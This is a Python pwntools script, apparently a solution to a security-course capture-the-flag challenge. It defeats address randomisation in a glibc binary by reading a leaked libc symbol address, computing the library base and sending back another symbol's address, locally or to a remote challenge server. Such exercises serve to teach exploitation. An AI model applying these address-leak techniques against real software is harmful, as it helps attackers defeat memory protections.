from pwn import *

context.log_level = "debug"

LOCAL = True


if LOCAL:
    p = process("./Glibc_files/glibc")
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
    e = ELF(libc)
    print(p.recvuntil(b"note: "))
    _IO_2_1_stdin__address = int.from_bytes(p.recvline().strip(), byteorder="little")
    print("_IO_2_1_stdin_ address", hex(_IO_2_1_stdin__address))
    _IO_2_1_stdin__offset = e.symbols["_IO_2_1_stdin_"]
    print("_IO_2_1_stdin_ offset", hex(_IO_2_1_stdin__offset))
    base_address = _IO_2_1_stdin__address - _IO_2_1_stdin__offset
    print("base address", hex(base_address))
    _IO_2_1_stdout__offset = e.symbols["_IO_2_1_stdout_"]
    print("_IO_2_1_stdout_ offset", hex(_IO_2_1_stdout__offset))

    _IO_2_1_stdout__address = base_address + _IO_2_1_stdout__offset
    print("_IO_2_1_stdout_ address", hex(_IO_2_1_stdout__address))
    p.recvuntil(b">")
    p.sendline(bin(_IO_2_1_stdout__address))
    p.recvline()
    print(p.recvline())
    p.recvline()
    print(p.recvline())

else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1235)
    p.recvuntil(b"abc123):")
    p.sendline(b"nam10102")
    libc = "./Glibc_files/libc.so.6"
    e = ELF(libc)
    _IO_2_1_stdin__offset = e.symbols["printf"]
    _IO_2_1_stdout__offset = e.symbols["sleep"]
    print(p.recvuntil(b"note: "))
    _IO_2_1_stdin__address = int.from_bytes(p.recvline().strip(), byteorder="little")
    print("printf offset", hex(_IO_2_1_stdin__offset))
    print("printf address", hex(_IO_2_1_stdin__address))
    print("sleep offset", hex(_IO_2_1_stdout__offset))
    base_address = _IO_2_1_stdin__address - _IO_2_1_stdin__offset
    print("base address", hex(base_address))
    _IO_2_1_stdout__address = base_address + _IO_2_1_stdout__offset
    print("sleep address", hex(_IO_2_1_stdout__address))
    byte_string = _IO_2_1_stdout__address.to_bytes((_IO_2_1_stdout__address.bit_length() + 7) // 8, byteorder='big')
    p.recvuntil(b">")
    p.sendline(hex(_IO_2_1_stdout__address))
    p.recvline()
    print(p.recvline())
    p.recvline()
    print(p.recvline())
